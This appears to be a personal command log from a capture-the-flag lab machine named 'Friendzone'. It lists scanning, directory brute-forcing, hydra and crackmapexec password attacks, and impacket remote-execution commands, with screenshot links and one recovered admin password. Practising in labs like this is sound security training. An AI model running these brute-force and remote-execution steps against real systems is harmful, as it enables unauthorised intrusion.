Friendzone
========================

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.123 | tee nmap_udp_output.txt

![qownnotes-media-gVKtdn](../../../media/qownnotes-media-gVKtdn.png)

    sudo nmap_enum friendzone.htb

![qownnotes-media-DVPbTF](../../../media/qownnotes-media-DVPbTF.png)

    sudo nmap -p- -Pn -T5 -n 10.10.10.123 | tee nmap_fullportstcp_output.txt

![qownnotes-media-vLZcwq](../../../media/qownnotes-media-vLZcwq.png)

    sudo nmap --script vuln -p 21,22,53,80,139,443,445 -T5 -n -Pn 10.10.10.123
    
![qownnotes-media-NJmFPV](../../../media/qownnotes-media-NJmFPV.png)

    
    enum4linux -a -A 10.10.10.123
    
![qownnotes-media-gnjlEv](../../../media/qownnotes-media-gnjlEv.png)

    gobuster dir -u http://10.10.10.123 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
    
![qownnotes-media-QdvtOH](../../../media/qownnotes-media-QdvtOH.png)

    gobuster dir -u http://10.10.10.123/wordpress -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
    
![qownnotes-media-HIHSsC](../../../media/qownnotes-media-HIHSsC.png)

    gobuster dir -u https://10.10.10.123 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_gobuster.txt"
 
 ![qownnotes-media-BJKudt](../../../media/qownnotes-media-BJKudt.png)

    hydra -L users.txt -P passwords.txt ftp://10.10.10.123
    
![qownnotes-media-KTaBlI](../../../media/qownnotes-media-KTaBlI.png)

    enum4linux -a -A -u admin -p 'WORKWORKHhallelujah@#' 10.10.10.123
    
![qownnotes-media-TrDJRu](../../../media/qownnotes-media-TrDJRu.png)

    impacket-dcomexec admin@10.10.10.123
    
    impacket-wmiexec admin@10.10.10.123
    
 ![qownnotes-media-fsAfdG](../../../media/qownnotes-media-fsAfdG.png)

    crackmapexec smb 10.10.10.123 -u users.txt -p passwords.txt
    
![qownnotes-media-nKTlTF](../../../media/qownnotes-media-nKTlTF.png)

    impacket-smbexec admin@10.10.10.123  

![qownnotes-media-TlIwDD](../../../media/qownnotes-media-TlIwDD.png)

    hydra -L users.txt -P passwords.txt ssh://10.10.10.123
    
![qownnotes-media-LDIcNU](../../../media/qownnotes-media-LDIcNU.png)

    crackmapexec smb 10.10.10.123 -u admin -p 'WORKWORKHhallelujah@#' -x whoami
 
![qownnotes-media-CYWVJb](../../../media/qownnotes-media-CYWVJb.png)

    firefox http://10.10.10.123

![qownnotes-media-pgUXHS](../../../media/qownnotes-media-pgUXHS.png)

    firefox http://friendzone.red

![qownnotes-media-bKXPRv](../../../media/qownnotes-media-bKXPRv.png)

    gobuster dir -u http://friendzone.red -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -b 302,403 -t 16 -o "tcp_port_protocol_ext_gobuster.txt"